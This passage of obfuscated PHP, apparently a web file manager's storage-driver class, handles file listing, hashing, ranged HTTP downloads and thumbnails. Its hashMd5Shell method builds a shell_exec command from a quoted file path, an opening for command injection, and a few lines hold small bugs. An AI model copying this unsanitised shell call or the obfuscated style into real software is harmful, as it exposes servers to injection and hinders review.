$ûŸï’Üå[$£öÊÆ¥á[78]]; $Éè‡—È¼[$£öÊÆ¥á[81]] = array($£öÊÆ¥á[82] => $ûŸï’Üå[$£öÊÆ¥á[79]], $£öÊÆ¥á[83] => $ûŸï’Üå[$£öÊÆ¥á[80]]); $ğĞ»ş“[$èÇ¥õø] = $Éè‡—È¼; } return $Éè‡—È¼; } public function listPath($áÓìÆµ, $»‚‡Â¤Ó = false) { } public function has($£ÎŠï…½, $‰Ó”å±‰ = false, $ĞÜì¬¥ = false) { } public function canRead($—üê½Ëû) { } public function canWrite($ŒŠŸÊšĞ) { } public function getContent($†¾õïúö) { } public function setContent($ ØçÈÌ, $ƒ” Æğ = '') { } protected function infoChildren($À‚ÏÖ—, &$§€ÀÈÚñ) { $™©óíåé =& $_SERVER[ ÇƒŠìÀ]; check_abort_echo(); $É­”™ıœ = $this->listPath($À‚ÏÖ—, !0); $É­”™ıœ = array_merge($É­”™ıœ[$™©óíåé[84]], $É­”™ıœ[$™©óíåé[85]]); foreach ($É­”™ıœ as $ôÕ“ù¦) { if ($ôÕ“ù¦[$™©óíåé[33]] == $™©óíåé[77]) { $§€ÀÈÚñ[$™©óíåé[80]]++; $‚›•¥Ã§ = $this->getPathInner($ôÕ“ù¦[$™©óíåé[86]]); $this->infoChildren($‚›•¥Ã§, $§€ÀÈÚñ); } else { $§€ÀÈÚñ[$™©óíåé[79]]++; $§€ÀÈÚñ[$™©óíåé[78]] += $ôÕ“ù¦[$™©óíåé[78]]; } } } public function fileSubstr($•Ö¦»µÏ, $‚¶ßú¶, $ª„‘¨Õ¯) { } public function listAll($õşÓöÉ”) { } public function listAllMake($ŞÔŸÕ‘›, &$ƒõÑÒ–¾) { $§µµüŠ =& $_SERVER[ ÇƒŠìÀ]; check_abort_echo(); $Œ£Ÿö½Ò = $this->listPath($ŞÔŸÕ‘›, !0); if (!$Œ£Ÿö½Ò) { return; } $©·éïöû = array_merge($Œ£Ÿö½Ò[$§µµüŠ[84]], $Œ£Ÿö½Ò[$§µµüŠ[85]]); foreach ($©·éïöû as $ç—ÌÚ›—) { $¶˜¡±¾ = $ç—ÌÚ›—[$§µµüŠ[33]] == $§µµüŠ[77]; $¶²†¦€ü = array($§µµüŠ[86] => $ç—ÌÚ›—[$§µµüŠ[86]], $§µµüŠ[77] => $¶˜¡±¾); if (isset($ç—ÌÚ›—[$§µµüŠ[78]])) { $¶²†¦€ü[$§µµüŠ[78]] = $ç—ÌÚ›—[$§µµüŠ[78]]; } if (isset($ç—ÌÚ›—[$§µµüŠ[87]])) { $¶²†¦€ü[$§µµüŠ[87]] = $ç—ÌÚ›—[$§µµüŠ[87]]; } if (!$¶˜¡±¾) { $ƒõÑÒ–¾[] = $¶²†¦€ü; continue; } $ƒõÑÒ–¾[] = $¶²†¦€ü; $ûûæ€Ÿ¿ = $ç—ÌÚ›—[$§µµüŠ[86]]; $±¢ìÖÅÂ = $this->pathDriver; if (substr($ç—ÌÚ›—[$§µµüŠ[86]], 0, strlen($±¢ìÖÅÂ)) == $±¢ìÖÅÂ) { $ûûæ€Ÿ¿ = substr($ûûæ€Ÿ¿, strlen($±¢ìÖÅÂ)); } $this->listAllMake($ûûæ€Ÿ¿, $ƒõÑÒ–¾); } } public function listAllSimple($³„“Ãş¤, $è”Ù¥Ö = false) { $¤ş‘‰ˆÙ = $this->listAll($³„“Ãş¤); return $this->listAllSimpleMake($¤ş‘‰ˆÙ, $this->getPathOuter($³„“Ãş¤), $è”Ù¥Ö); } public function listAllSimpleMake($¤ŞÂìğ, $ğöœ¢Õ, $Âƒ˜‹ƒü) { $¤ÓÁ»“¤ =& $_SERVER[ ÇƒŠìÀ]; $‡íÉ¬¹‘ = array(); $ğöœ¢Õ = rtrim(get_path_father($ğöœ¢Õ), $¤ÓÁ»“¤[8]) . $¤ÓÁ»“¤[8]; foreach ($¤ŞÂìğ as $¾¼ºÏµ­) { $ÊÊ½…•« = array($¤ÓÁ»“¤[86] => $¾¼ºÏµ­[$¤ÓÁ»“¤[86]], $¤ÓÁ»“¤[88] => $¾¼ºÏµ­[$¤ÓÁ»“¤[86]], $¤ÓÁ»“¤[77] => $¾¼ºÏµ­[$¤ÓÁ»“¤[77]]); if (isset($¾¼ºÏµ­[$¤ÓÁ»“¤[78]]) && !$¾¼ºÏµ­[$¤ÓÁ»“¤[77]]) { $ÊÊ½…•«[$¤ÓÁ»“¤[78]] = $¾¼ºÏµ­[$¤ÓÁ»“¤[78]]; } if (isset($¾¼ºÏµ­[$¤ÓÁ»“¤[87]])) { $ÊÊ½…•«[$¤ÓÁ»“¤[87]] = $¾¼ºÏµ­[$¤ÓÁ»“¤[87]]; } if (is_array($¾¼ºÏµ­[$¤ÓÁ»“¤[89]])) { $ÊÊ½…•«[$¤ÓÁ»“¤[88]] = $¾¼ºÏµ­[$¤ÓÁ»“¤[89]][$¤ÓÁ»“¤[86]]; $ÊÊ½…•«[$¤ÓÁ»“¤[78]] = $¾¼ºÏµ­[$¤ÓÁ»“¤[89]][$¤ÓÁ»“¤[78]]; $ÊÊ½…•«[$¤ÓÁ»“¤[87]] = $¾¼ºÏµ­[$¤ÓÁ»“¤[89]][$¤ÓÁ»“¤[87]]; } else { if (substr($¾¼ºÏµ­[$¤ÓÁ»“¤[86]], 0, strlen($ğöœ¢Õ)) == $ğöœ¢Õ) { $ÊÊ½…•«[$¤ÓÁ»“¤[86]] = substr($¾¼ºÏµ­[$¤ÓÁ»“¤[86]], strlen($ğöœ¢Õ)); } } $ÍµÀ¥Ü¢ = $¾¼ºÏµ­[$¤ÓÁ»“¤[77]] ? $¤ÓÁ»“¤[8] : $¤ÓÁ»“¤[12]; $ÊÊ½…•«[$¤ÓÁ»“¤[88]] = rtrim($ÊÊ½…•«[$¤ÓÁ»“¤[88]], $¤ÓÁ»“¤[8]) . $ÍµÀ¥Ü¢; $ÊÊ½…•«[$¤ÓÁ»“¤[86]] = $¤ÓÁ»“¤[8] . trim($ÊÊ½…•«[$¤ÓÁ»“¤[86]], $¤ÓÁ»“¤[8]) . $ÍµÀ¥Ü¢; if (!$Âƒ˜‹ƒü) { $©Ä§¸ˆÑ = explode($¤ÓÁ»“¤[8], trim($ÊÊ½…•«[$¤ÓÁ»“¤[86]], $¤ÓÁ»“¤[8])); $ÊÊ½…•«[$¤ÓÁ»“¤[86]] = $¤ÓÁ»“¤[8] . implode($¤ÓÁ»“¤[8], array_slice($©Ä§¸ˆÑ, 1)) . $ÍµÀ¥Ü¢; } $‡íÉ¬¹‘[] = $ÊÊ½…•«; } return array_sort_by($‡íÉ¬¹‘, $¤ÓÁ»“¤[86]); } public function upload($ ã­×úÎ, $½•âƒ–†, $²»Ğâ¼ = false, $ùÓ»¢Çò = REPEAT_REPLACE) { } public function uploadFileByID($óÌÜËè, $»êŞÇÕ, $ê¹–Î™º) { } public function uploadFileByPath($”İÆĞßî, $éÆİìŠ¥, $şÓï°¤ = array()) { } public function isUploadServer() { $Û†’è =& $_SERVER[ ÇƒŠìÀ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Û†’è[90]) { return !0; } return $GLOBALS[$Û†’è[6]][$Û†’è[91]][$Û†’è[92]]; } public function isFileOutServer() { $¦èÓ¨Ó =& $_SERVER[ ÇƒŠìÀ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¦èÓ¨Ó[90]) { return !0; } return $GLOBALS[$¦èÓ¨Ó[6]][$¦èÓ¨Ó[91]][$¦èÓ¨Ó[93]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ıíô¥ˆ‚) { $ùªŠ°ø… =& $_SERVER[ ÇƒŠìÀ]; if (!$this->isCdnHost()) { return $ıíô¥ˆ‚; } return str_replace(trim(get_url_root($ıíô¥ˆ‚), $ùªŠ°ø…[8]), trim($this->cdnHost, $ùªŠ°ø…[8]), $ıíô¥ˆ‚); } public function uploadLink($ç¿ØˆíÈ, $…ÇŸ ·§ = 0) { $ãüâ¯ˆÇ =& $_SERVER[ ÇƒŠìÀ]; if ($this->isUploadServer()) { return; } $ôÆöôò‹ = $this->getType(); if (!in_array($ôÆöôò‹, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $§¦ëòìˆ = 1024 * 1024 * 10; $˜€‡† = $…ÇŸ ·§ <= $§¦ëòìˆ ? $ãüâ¯ˆÇ[94] : $ãüâ¯ˆÇ[95]; $’úúñÕ = (!$…ÇŸ ·§ ? 1 : ceil($…ÇŸ ·§ / pow(1024, 3))) * 3600 * 4; $éÚ«ñ® = $this->{$˜€‡†}($ç¿ØˆíÈ, $’úúñÕ); if ($éÚ«ñ®) { $éÚ«ñ®[$ãüâ¯ˆÇ[96]] = $ç¿ØˆíÈ; $éÚ«ñ®[$ãüâ¯ˆÇ[97]] = $ôÆöôò‹; } return $éÚ«ñ®; } public function uploadFormData($Ş©±šƒÁ, $ÚíüÅÖ½ = 3600) { } public function multiUploadFormData($ÆáÄôàŒ, $‹·¿›ü‘ = 3600) { } public function download($è‹Éƒ´ã, $¬ÈÀ÷Íã) { } public function ext($ãäÉÄÈ„) { $ş¤òÄ×Œ =& $_SERVER[ ÇƒŠìÀ]; if (strpos($ãäÉÄÈ„, $ş¤òÄ×Œ[8]) === -1) { $çüû¸˜ = $ãäÉÄÈ„; } else { $çüû¸˜ = $this->pathThis($ãäÉÄÈ„); } $Ü¤İğªø = $ş¤òÄ×Œ[12]; if (strstr($çüû¸˜, $ş¤òÄ×Œ[10])) { $Ü¤İğªø = substr($çüû¸˜, strrpos($çüû¸˜, $ş¤òÄ×Œ[10]) + 1); $Ü¤İğªø = strtolower($Ü¤İğªø); } if (strlen($Ü¤İğªø) > 3 && preg_match($ş¤òÄ×Œ[98], $Ü¤İğªø, $Ò¦Ò²É¼)) { $Ü¤İğªø = $ş¤òÄ×Œ[12]; } return $Ü¤İğªø; } public function pathThis($«œÉåŞË) { $ë·ØáÖ =& $_SERVER[ ÇƒŠìÀ]; $«œÉåŞË = str_replace($ë·ØáÖ[99], $ë·ØáÖ[8], rtrim($«œÉåŞË, $ë·ØáÖ[8])); $´²Ú¶êÃ = strrpos($«œÉåŞË, $ë·ØáÖ[8]); if ($´²Ú¶êÃ === !1) { return $«œÉåŞË; } return substr($«œÉåŞË, $´²Ú¶êÃ + 1); } public function pathFather($ÎğÕ±¤æ) { $ñ£œâŠÅ =& $_SERVER[ ÇƒŠìÀ]; $ÎğÕ±¤æ = str_replace($ñ£œâŠÅ[99], $ñ£œâŠÅ[8], rtrim($ÎğÕ±¤æ, $ñ£œâŠÅ[8])); $¥¼ÚÅ§ = strrpos($ÎğÕ±¤æ, $ñ£œâŠÅ[8]); if ($¥¼ÚÅ§ === !1) { return $ñ£œâŠÅ[12]; } return substr($ÎğÕ±¤æ, 0, $¥¼ÚÅ§ + 1); } public function hashSimple($ìµÊî•Ø) { $ÂÂ´ïÃ =& $_SERVER[ ÇƒŠìÀ]; if (!$ìµÊî•Ø) { return md5($ÂÂ´ïÃ[12]); } $ì„±‹ = $this->size($ìµÊî•Ø); $´Ñ¥˜µ = 200; $­î‰¤ı÷ = 50; if ($ì„±‹ <= $´Ñ¥˜µ * $­î‰¤ı÷) { return $this->hashMd5($ìµÊî•Ø) . $ì„±‹; } $¿½§Î€½ = intval($ì„±‹ / $­î‰¤ı÷); $´²Æ¬¼Ë = $ÂÂ´ïÃ[12]; for ($·‹¯œÔî = 0; $·‹¯œÔî < $­î‰¤ı÷; $·‹¯œÔî++) { $´²Æ¬¼Ë .= $this->fileSubstr($ìµÊî•Ø, $¿½§Î€½ * $·‹¯œÔî, $´Ñ¥˜µ); } $´²Æ¬¼Ë .= $this->fileSubstr($ìµÊî•Ø, $ì„±‹ - $´Ñ¥˜µ, $´Ñ¥˜µ); return md5($´²Æ¬¼Ë) . $ì„±‹; } public static $md5Cache = array(); public function hashMd5($ÃÖ™¿ÁÛ) { if (!$ÃÖ™¿ÁÛ) { return md5($_SERVER[ ÇƒŠìÀ][12]); } $ÃÖ™¿ÁÛ = $this->iconvSystem($ÃÖ™¿ÁÛ); if (isset(self::$md5Cache[$ÃÖ™¿ÁÛ])) { return self::$md5Cache[$ÃÖ™¿ÁÛ]; } self::$md5Cache[$ÃÖ™¿ÁÛ] = $this->hashMd5Shell($ÃÖ™¿ÁÛ); if (!self::$md5Cache[$ÃÖ™¿ÁÛ]) { self::$md5Cache[$ÃÖ™¿ÁÛ] = @md5_file($ÃÖ™¿ÁÛ); } return self::$md5Cache[$ÃÖ™¿ÁÛ]; } private function hashMd5Shell($¹Æ§ò™) { $úÁŞ£‹± =& $_SERVER[ ÇƒŠìÀ]; if (!$¹Æ§ò™) { return md5($úÁŞ£‹±[12]); } if (!function_exists($úÁŞ£‹±[100])) { return !1; } $©¾±¸Â = array($úÁŞ£‹±[101], $úÁŞ£‹±[102]); $ş‚Çíæœ = Cache::get($úÁŞ£‹±[103]); if (!$ş‚Çíæœ) { $¤ÎÑÙâ® = BASIC_PATH . $úÁŞ£‹±[104]; $ñÊäêş = md5_file($¤ÎÑÙâ®); $ş‚Çíæœ = $úÁŞ£‹±[105]; foreach ($©¾±¸Â as $Òœáà…Æ) { $™°ª˜šà = shell_exec($Òœáà…Æ . "\40\42{$¤ÎÑÙâ®}\x22"); if ($™°ª˜šà && substr(trim($™°ª˜šà), 0, 32) == $ñÊäêş) { $ş‚Çíæœ = $Òœáà…Æ; break; } } Cache::set($úÁŞ£‹±[103], $ş‚Çíæœ, 3600); } if ($ş‚Çíæœ == $úÁŞ£‹±[105]) { return !1; } $™°ª˜šà = shell_exec($ş‚Çíæœ . "\40\x22{$¹Æ§ò™}\42"); $™°ª˜šà = str_replace($úÁŞ£‹±[106], $úÁŞ£‹±[12], $™°ª˜šà); return substr($™°ª˜šà, 0, 32); } public function link($•è²õÈ) { return $•è²õÈ; } public function fileOut($ıİşåİ“, $ÕÑæƒÍæ = false, $”ÁŞİØ¨ = false, $Â‚­Ú¥º = '') { $«¶ç½Ç¥ =& $_SERVER[ ÇƒŠìÀ]; $this->cacheMethod(null, null); if (!$ıİşåİ“ || !$this->exist($ıİşåİ“)) { show_json(LNG($«¶ç½Ç¥[107]), !1, $”ÁŞİØ¨); } $ÁèòÄÜ¼ = $this->getType() == $«¶ç½Ç¥[108]; $±Î£•ö¢ = $GLOBALS[$«¶ç½Ç¥[6]][$«¶ç½Ç¥[91]][$«¶ç½Ç¥[109]][$«¶ç½Ç¥[110]]; $ØçØğä¸ = (double) $GLOBALS[$«¶ç½Ç¥[6]][$«¶ç½Ç¥[91]][$«¶ç½Ç¥[109]][$«¶ç½Ç¥[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™åÀÛ¬Å = $this->infoFull($ıİşåİ“); $şàùúÕ = $™åÀÛ¬Å[$«¶ç½Ç¥[78]]; $Ş¥•›öĞ = gmdate($«¶ç½Ç¥[112], $™åÀÛ¬Å[$«¶ç½Ç¥[87]]); $“‰÷Úù = $”ÁŞİØ¨ ? $”ÁŞİØ¨ : $this->iconvApp($™åÀÛ¬Å[$«¶ç½Ç¥[32]]); $ÒÂ¸êÙû = 0; $˜´î¤‚û = $şàùúÕ - 1; $´¸È»¤§ = $this->ext($“‰÷Úù); if (in_array($´¸È»¤§, array($«¶ç½Ç¥[113], $«¶ç½Ç¥[114], $«¶ç½Ç¥[115], $«¶ç½Ç¥[116]))) { $´¸È»¤§ = $«¶ç½Ç¥[117]; } if (in_array($´¸È»¤§, array($«¶ç½Ç¥[118]))) { $´¸È»¤§ = $«¶ç½Ç¥[119]; } if (!$Â‚­Ú¥º) { $Â‚­Ú¥º = md5($Ş¥•›öĞ . $şàùúÕ); } $Â‚­Ú¥º = $«¶ç½Ç¥[120] . $Â‚­Ú¥º . $«¶ç½Ç¥[120]; $ìô‹ñ¤ = get_file_mime($´¸È»¤§); $¥Ñàº´â = !0; $¥Ñàº´â = isset($_GET[$«¶ç½Ç¥[121]]) ? !1 : !0; if ($ÕÑæƒÍæ === !1 && !mime_support($ìô‹ñ¤)) { $ìô‹ñ¤ = $«¶ç½Ç¥[122]; } header($«¶ç½Ç¥[123]); header($«¶ç½Ç¥[124] . $ìô‹ñ¤); $Âè…ı•€ = rawurlencode($“‰÷Úù); $Âè…ı•€ = $«¶ç½Ç¥[120] . $Âè…ı•€ . $«¶ç½Ç¥[125] . $Âè…ı•€; if ($ÕÑæƒÍæ) { header($«¶ç½Ç¥[126]); header($«¶ç½Ç¥[127] . $Âè…ı•€); } else { if ($¥Ñàº´â) { header($«¶ç½Ç¥[128] . $Âè…ı•€); } } header($«¶ç½Ç¥[129] . gmdate($«¶ç½Ç¥[112], time() + 3600 * 24 * 30) . $«¶ç½Ç¥[130]); header($«¶ç½Ç¥[131]); header($«¶ç½Ç¥[132]); header($«¶ç½Ç¥[133]); if (isset($_SERVER[$«¶ç½Ç¥[134]]) && strtotime($_SERVER[$«¶ç½Ç¥[134]]) == $™åÀÛ¬Å[$«¶ç½Ç¥[87]]) { header($«¶ç½Ç¥[135], !0, 304); die; } if (isset($_SERVER[$«¶ç½Ç¥[136]]) && $_SERVER[$«¶ç½Ç¥[136]] == $Â‚­Ú¥º) { header($«¶ç½Ç¥[137] . $Â‚­Ú¥º, !0, 304); die; } header($«¶ç½Ç¥[137] . $Â‚­Ú¥º); header($«¶ç½Ç¥[138] . $Ş¥•›öĞ . $«¶ç½Ç¥[130]); header($«¶ç½Ç¥[139] . $“‰÷Úù); header($«¶ç½Ç¥[140]); header($«¶ç½Ç¥[141] . $şàùúÕ); header($«¶ç½Ç¥[142]); Hook::trigger($«¶ç½Ç¥[143], $ıİşåİ“, $şàùúÕ, $“‰÷Úù, $´¸È»¤§); if (!$ÕÑæƒÍæ && $´¸È»¤§ == $«¶ç½Ç¥[144]) { if ($şàùúÕ > 1024 * 1024 * 5) { die; } $áá„û¦ë = $this->getContent($ıİşåİ“); $áá„û¦ë = Html::clearSVG($áá„û¦ë); header($«¶ç½Ç¥[145] . strlen($áá„û¦ë)); echo $áá„û¦ë; die; } $¦€»ã‚Ô = strtolower($_SERVER[$«¶ç½Ç¥[146]]); if ($ÁèòÄÜ¼ && $¦€»ã‚Ô && $±Î£•ö¢) { if (strstr($¦€»ã‚Ô, $«¶ç½Ç¥[147])) { header($«¶ç½Ç¥[148] . $ıİşåİ“); } else { if (strstr($¦€»ã‚Ô, $«¶ç½Ç¥[149])) { header($«¶ç½Ç¥[150] . $ıİşåİ“); } else { if (strstr($¦€»ã‚Ô, $«¶ç½Ç¥[151])) { header($«¶ç½Ç¥[152] . $ıİşåİ“); } } } if ($ØçØğä¸) { header($«¶ç½Ç¥[153] . $ØçØğä¸); } return; } if (isset($_SERVER[$«¶ç½Ç¥[154]])) { if (preg_match($«¶ç½Ç¥[155], $_SERVER[$«¶ç½Ç¥[154]], $øĞõş¦ı)) { $ÒÂ¸êÙû = intval($øĞõş¦ı[1]); $ÒÂ¸êÙû = $ÒÂ¸êÙû <= 0 ? 0 : ($ÒÂ¸êÙû >= $˜´î¤‚û ? $˜´î¤‚û : $ÒÂ¸êÙû); if (!empty($øĞõş¦ı[2])) { $’¦é¨ä— = intval($øĞõş¦ı[2]); $˜´î¤‚û = $’¦é¨ä— < $ÒÂ¸êÙû ? $ÒÂ¸êÙû : ($’¦é¨ä— >= $˜´î¤‚û ? $˜´î¤‚û : $’¦é¨ä—); } } header($«¶ç½Ç¥[156]); header("\103\x6f\156\164\x65\156\x74\55\122\x61\156\x67\145\x3a\40\x62\x79\164\x65\x73\40{$ÒÂ¸êÙû}\x2d{$˜´î¤‚û}\x2f" . $şàùúÕ); } else { header($«¶ç½Ç¥[157]); } header($«¶ç½Ç¥[158]); $Òšßœ£– = !0; if ($_SERVER[$«¶ç½Ç¥[159]] == $«¶ç½Ç¥[160] && $şàùúÕ > 1204 * 1024 * 1024 * 2) { $Òšßœ£– = !1; } if ($Òšßœ£–) { header($«¶ç½Ç¥[161] . ($˜´î¤‚û - $ÒÂ¸êÙû + 1)); } if ($_SERVER[$«¶ç½Ç¥[162]] == $«¶ç½Ç¥[163]) { return; } $Èù˜õ´„ = 1024 * 100; $Ş½’‚¡ˆ = 0; if ($ØçØğä¸) { $Ş½’‚¡ˆ = intval(1000 * 1000 * ($Èù˜õ´„ / $ØçØğä¸)); } while ($ÒÂ¸êÙû <= $˜´î¤‚û) { $´ÜŸ¥Â = timeFloat(); check_abort(); $È± æ è = $˜´î¤‚û - $ÒÂ¸êÙû + 1; if ($È± æ è <= $Èù˜õ´„) { $Èù˜õ´„ = $È± æ è; } echo $this->fileSubstr($ıİşåİ“, $ÒÂ¸êÙû, $Èù˜õ´„); $ÒÂ¸êÙû += $Èù˜õ´„; if ($Èù˜õ´„ == $È± æ è) { $ÒÂ¸êÙû = $˜´î¤‚û + 1; } if ($Ş½’‚¡ˆ) { $Á÷Ô›¡¼ = intval(1000 * 1000 * (timeFloat() - $´ÜŸ¥Â)); $µ‘±¸‚º = $Ş½’‚¡ˆ - $Á÷Ô›¡¼; if ($µ‘±¸‚º > 5) { usleep($µ‘±¸‚º); } } } } public function fileOutServer($â‹Ø¦•Ö, $ƒ¸…Æ”Å = false, $ÇÍ›¯œ‡ = false, $ÁúÉßÜ¡ = '') { $this->fileOut($â‹Ø¦•Ö, $ƒ¸…Æ”Å, $ÇÍ›¯œ‡, $ÁúÉßÜ¡); } public function fileOutLink($Ûô¼„ÀÙ) { header($_SERVER[ ÇƒŠìÀ][164] . $Ûô¼„ÀÙ); die; } public function cacheMethod($â„¿ƒ«, $‘¡£„Ó, $Âó•ä¥³ = null) { $£¹ˆÁ“¥ =& $_SERVER[ ÇƒŠìÀ]; static $ÖúÊÊÇà = array(); $Ö’ØúŒ = $‘¡£„Ó ? ltrim($this->getPathOuter($‘¡£„Ó), $£¹ˆÁ“¥[8]) : $£¹ˆÁ“¥[12]; $ôî¬ˆÉç = $£¹ˆÁ“¥[165] . $â„¿ƒ« . $£¹ˆÁ“¥[166] . rtrim($Ö’ØúŒ, $£¹ˆÁ“¥[8]); if (is_null($â„¿ƒ«)) { $ÖúÊÊÇà = array(); return; } if (is_null($‘¡£„Ó)) { foreach ($ÖúÊÊÇà as $ôî¬ˆÉç => $úşàüìü) { if (!strstr($ôî¬ˆÉç, $£¹ˆÁ“¥[165] . $â„¿ƒ« . $£¹ˆÁ“¥[167])) { continue; } unset($ÖúÊÊÇà[$ôî¬ˆÉç]); } return; } if (!is_null($Âó•ä¥³)) { $ÖúÊÊÇà[$ôî¬ˆÉç] = $Âó•ä¥³; return; } $…î…¨€ô = isset($ÖúÊÊÇà[$ôî¬ˆÉç]) ? $ÖúÊÊÇà[$ôî¬ˆÉç] : null; if (!is_null($…î…¨€ô)) { return $…î…¨€ô; } $…î…¨€ô = $this->{$â„¿ƒ«}($‘¡£„Ó); $ÖúÊÊÇà[$ôî¬ˆÉç] = $…î…¨€ô; return $…î…¨€ô; } public function cacheMethodInfoSet($·éŠ±Å€, $–Â—Æñ, $À‹÷–›ø = false) { $‚ÉÄûà =& $_SERVER[ ÇƒŠìÀ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‚ÉÄûà[168], $·éŠ±Å€, $–Â—Æñ); $this->cacheMethod($‚ÉÄûà[169], $·éŠ±Å€, $–Â—Æñ ? !1 : !0); if (is_array($À‹÷–›ø)) { $this->cacheMethod($‚ÉÄûà[170], $·éŠ±Å€, $À‹÷–›ø); } } public function fileOutImage($ÕœÙî²÷, $Á•¼ìÁª = 250) { $şıªéÃÂ =& $_SERVER[ ÇƒŠìÀ]; set_timeout(); if (substr($ÕœÙî²÷, 0, 4) == $şıªéÃÂ[151]) { $this->fileOutLink($ÕœÙî²÷); } $ºÑšòƒ“ = $this->info($ÕœÙî²÷); $êèå°«µ = !1; $Ê°´ïØ­ = isset($GLOBALS[$şıªéÃÂ[171]]) ? $GLOBALS[$şıªéÃÂ[171]] : array(); if ($Ê°´ïØ­ && $Ê°´ïØ­[$şıªéÃÂ[172]] == $ºÑšòƒ“[$şıªéÃÂ[86]]) { $ºÑšòƒ“ = $Ê°´ïØ­; $ë‚¶¬®Ö = $ºÑšòƒ“[$şıªéÃÂ[173]]; if ($ë‚¶¬®Ö && isset($ë‚¶¬®Ö[$şıªéÃÂ[174]])) { if ($ë‚¶¬®Ö[$şıªéÃÂ[174]] <= $Á•¼ìÁª && $ë‚¶¬®Ö[$şıªéÃÂ[175]] <= $Á•¼ìÁª) { $êèå°«µ = !0; } } } if ($ºÑšòƒ“[$şıªéÃÂ[78]] <= 1024 * 50 || $êèå°«µ || !function_exists($şıªéÃÂ[176]) || $ºÑšòƒ“[$şıªéÃÂ[177]] == $şıªéÃÂ[178]) { return $this->fileOut($ÕœÙî²÷, !1, $ºÑšòƒ“[$şıªéÃÂ[32]]); } $ıöÏì« = kodIO::hashPath($ºÑšòƒ“); $¾ñÕÄêË = "\143\157\x76\145\162\x5f{$ıöÏì«}\137{$Á•¼ìÁª}\x2e\x70\x6e\147"; $äÃ„½ = IO_PATH_SYSTEM_TEMP . $şıªéÃÂ[179]; $Â·Ïœ¬ğ = IO::infoFullSimple($äÃ„½); $’¸±õ¤­ = $Â·Ïœ¬ğ && is_array($Â·Ïœ¬ğ) ? $Â·Ïœ¬ğ[$şıªéÃÂ[86]] : $şıªéÃÂ[12]; if (!$’¸±õ¤­) { $’¸±õ¤­ = IO::mkdir($äÃ„½); } if ($ºÑšòƒ“[$şıªéÃÂ[180]] == $şıªéÃÂ[181] && isset($ºÑšòƒ“[$şıªéÃÂ[182]]) && $ºÑšòƒ“[$şıªéÃÂ[182]] == kodIO::sourceID($’¸±õ¤­)) { $¢õÕŒÀñ = $ºÑšòƒ“[$şıªéÃÂ[183]]; if ($Á•¼ìÁª <= 500) { $­˜ˆ­ëĞ = preg_replace($şıªéÃÂ[184], $şıªéÃÂ[185], $ºÑšòƒ“[$şıªéÃÂ[32]]); $¢õÕŒÀñ = IO::fileNameExist($’¸±õ¤­, $­˜ˆ­ëĞ); } return IO::fileOut(KodIO::make($¢õÕŒÀñ), !1, $ºÑšòƒ“[$şıªéÃÂ[32]]); } $İ ¹ÔŒå = IO::fileNameExist($’¸±õ¤­, $¾ñÕÄêË); if ($İ ¹ÔŒå) { return IO::fileOut(KodIO::make($İ ¹ÔŒå), !1, $ºÑšòƒ“[$şıªéÃÂ[32]]); } if ($Á•¼ìÁª > 1000) { $this->makeImageCover($’¸±õ¤­, $ÕœÙî²÷, $¾ñÕÄêË, $Á•¼ìÁª); $this->makeImageCover($’¸±õ¤­, $ÕœÙî²÷, "\x63\157\166\x65\162\137{$ıöÏì«}\137\x32\x35\x30\56\160\x6e\x67", 250); $İ ¹ÔŒå = IO::fileNameExist($’¸±õ¤­, $¾ñÕÄêË); if ($İ ¹ÔŒå) { return IO::fileOut(KodIO::make($İ ¹ÔŒå), !1, $ºÑšòƒ“[$şıªéÃÂ[32]]); } die; } $ş…ÑûÕš = Cache::get($¾ñÕÄêË); if ($ş…ÑûÕš == $şıªéÃÂ[186] || $ş…ÑûÕš == $şıªéÃÂ[187]) { echo $ş…ÑûÕš; die; } Cache::set($¾ñÕÄêË, $şıªéÃÂ[187], 60); $ÓÆıìäí = array($’¸±õ¤­, $ºÑšòƒ“[$şıªéÃÂ[86]], $¾ñÕÄêË, $Á•¼ìÁª); $¢«ì›‹ = $şıªéÃÂ[188] . $ºÑšòƒ“[$şıªéÃÂ[78]] . $şıªéÃÂ[189] . $¾ñÕÄêË . $şıªéÃÂ[190] . $ºÑšòƒ“[$şıªéÃÂ[32]] . $şıªéÃÂ[191] . $ºÑšòƒ“[$şıªéÃÂ[86]]; TaskQueue::add($şıªéÃÂ[192], $ÓÆıìäí, $¢«ì›‹, $¾ñÕÄêË); } public function makeImageCover($æı„•è£, $Óı£ÂË, $¶ç¹¬¬”, $ùøµù) { $Ó‡½óµ =& $_SERVER[ ÇƒŠìÀ]; if (IO::fileNameExist($æı„•è£, $¶ç¹¬¬”)) { return $Ó‡½óµ[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¿¥İÜ€ = DATA_THUMB . $¶ç¹¬¬”; del_file($¿¥İÜ€); $¹‹£ÏÇ = TEMP_FILES . $¶ç¹¬¬”; if (!@file_exists($¹‹£ÏÇ)) { $¹‹£ÏÇ = $this->download($Óı£ÂË, $¹‹£ÏÇ); } if (!@file_exists($¹‹£ÏÇ)) { return $Ó‡½óµ[194]; } ImageThumb::createThumb($¹‹£ÏÇ, $¿¥İÜ€, $ùøµù, $ùøµù * 10); if (@file_exists($¿¥İÜ€)) { Cache::remove($¶ç¹¬¬”); return IO::move($¿¥İÜ€, $æı„•è£); } Cache::set($¶ç¹¬¬”, $Ó‡½óµ[186], 600); del_file($¿¥İÜ€); return $Ó‡½óµ[195] . $¹‹£ÏÇ . $Ó‡½óµ[73]; } public function fileOutImageServer($ê‘ÀÓ„×, $œÖÎ³¤ = 250) { $this->fileOutImage($ê‘ÀÓ„×, $œÖÎ³¤); } public function fileNameAuto($ôÄòÍÀà, $Ã¥Úğ¢ô, $£ª¸±í© = REPEAT_RENAME, $ŸÏÜÓú÷ = false) { $¶Ïßàôö =& $_SERVER[ ÇƒŠìÀ]; $ïÚÜôâö = $ôÄòÍÀà === $¶Ïßàôö[12] ? $Ã¥Úğ¢ô : rtrim($ôÄòÍÀà, $¶Ïßàôö[8]) . $¶Ïßàôö[8] . $Ã¥Úğ¢ô; if ($£ª¸±í© == REPEAT_REPLACE || !$this->exist($ïÚÜôâö) || $ŸÏÜÓú÷ && $£ª¸±í© != 